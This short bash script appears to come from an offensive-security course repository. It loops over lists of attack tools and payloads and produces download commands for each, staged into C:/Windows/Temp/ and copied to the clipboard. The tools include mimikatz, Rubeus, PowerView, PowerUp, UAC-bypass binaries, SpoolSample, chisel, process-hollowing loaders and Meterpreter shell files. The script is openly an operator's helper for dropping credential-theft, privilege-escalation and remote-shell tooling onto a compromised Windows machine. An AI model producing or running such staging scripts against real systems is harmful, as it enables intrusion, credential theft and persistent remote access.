#!/bin/bash

ps1='enum-ad.ps1\nenum-local.ps1\nenum-ad.ps1\npowerview.ps1\nmssql-client.ps1\nPowerUp.ps1\nportscan.ps1\npowermad.ps1\nhollow.ps1\nuac-bypass.ps1\n'

printf "$ps1" | while IFS= read -r command; do
  ~/gitlab/osep/util/downloadstring.sh "$command" | xsel -bi
  sleep 1
done

files='mimikatzx64.exe\nmimidrv.sys\nSpoolSampleModified.exe\nBypassUAC.exe\nSharpNoPSExec.exe\nchisel_1.9.1_windows_amd64.exe\nRubeus-lab.exe\nSpoolSample.exe\n'

printf "$files" | while IFS= read -r command; do
  ~/gitlab/osep/util/downloadfile.sh "$command" C:/Windows/Temp/ | xsel -bi
  sleep 1
done

iwrfiles='shell.xml\nmet.xml\nNtHollow.exe\nPsUnlocker.dll\n'

printf "$iwrfiles" | while IFS= read -r command; do
  ~/gitlab/osep/util/iwr.sh "$command" C:/Windows/Temp/ | xsel -bi
  sleep 1
done

